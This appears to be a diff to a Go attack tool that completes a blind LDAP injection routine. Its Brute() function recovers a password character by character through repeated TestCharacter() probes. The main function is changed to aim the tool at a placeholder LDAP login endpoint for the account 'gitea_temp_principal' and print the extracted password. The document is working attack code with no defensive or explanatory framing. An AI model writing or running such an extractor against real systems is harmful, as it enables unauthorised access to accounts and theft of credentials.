@@ -56,8 +56,23 @@ func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
 			return string(c), nil
 		}
 	}
+	return "", nil
 }
-func (li *LdapInjector) Brute() (string, error)
+
+func (li *LdapInjector) Brute() (string, error) {
+	var result string
+	for {
+		c, err := li.TestCharacter(result)
+		if err != nil {
+			return "", err
+		}
+		if c == "" {
+			break
+		}
+		result += c
+	}
+	return result, nil
+}
 
 func CreateCharset() string {
 	var charset string
@@ -72,6 +87,11 @@ func CreateCharset() string {
 }
 
 func main() {
-	//c := NewLdapInjector("ldap://<ip>:<port>/login", "gitea_temp_principal")
-	fmt.Println(CreateCharset())
+	c := NewLdapInjector("ldap://<ip>:<port>/login", "gitea_temp_principal")
+	password, err := c.Brute()
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println(password)
 }
